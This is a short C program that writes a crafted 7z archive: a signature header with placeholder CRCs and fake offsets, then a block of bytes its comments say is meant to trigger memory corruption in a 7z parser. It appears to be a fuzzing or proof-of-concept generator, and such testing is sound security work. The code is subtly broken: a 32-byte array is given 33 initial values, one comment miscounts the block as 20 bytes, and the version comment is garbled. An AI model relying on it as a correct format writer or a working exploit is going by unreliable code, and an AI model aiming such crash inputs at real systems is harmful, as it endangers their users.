#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

// Utility to write bytes to a file
void write_bytes(FILE *f, const void *data, size_t len) {
    if (fwrite(data, 1, len, f) != len) {
        perror("Write failed");
        exit(1);
    }
}

int main() {
    FILE *f = fopen("crafted.7z", "wb");
    if (!f) {
        perror("Unable to open file");
        return 1;
    }

    // 7z Signature Header (32 bytes)
    uint8_t signature_header[32] = {
        // 7z signature (6 bytes)
        0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C,
        // Version (2 bytes): 0.04 0.3 (common version)
        0x00, 0x04,
        // Start Header CRC (4 bytes): just placeholder
        0x00, 0x00, 0x00, 0x00,
        // Next Header offset (8 bytes): fake
        0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Next Header size (8 bytes): fake small size
        0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Next Header CRC (4 bytes): placeholder
        0x00, 0x00, 0x00, 0x00
    };

    write_bytes(f, signature_header, sizeof(signature_header));

    // Padding to simulate space between header + next header
    uint8_t padding[0x10] = {0};
    write_bytes(f, padding, sizeof(padding));

    // --- Begin "Next Header" block (20 bytes) ---
    // This is where you’d fuzz / inject corruption
    // For example: malformed ID or broken structure

    uint8_t next_header[0x20] = {
        // Header ID: 0x01 = kEncodedHeader (could replace with invalid ID)
        0x01,
        // Garbage / malformed content to trigger memory corruption
        0xFF, 0xFF, 0xFF, 0xFF,
        0xAA, 0xBB, 0xCC, 0xDD,
        0x00, 0x00, 0x00, 0x00,
        0xDE, 0xAD, 0xBE, 0xEF,
        0x11, 0x22, 0x33, 0x44,
        0x55, 0x66, 0x77, 0x88,
        0x99, 0x00, 0x00, 0x00,
        0xFE, 0xED, 0xFA, 0xCE
    };

    write_bytes(f, next_header, sizeof(next_header));

    fclose(f);

    printf("crafted.7z generated.\n");
    return 0;
}
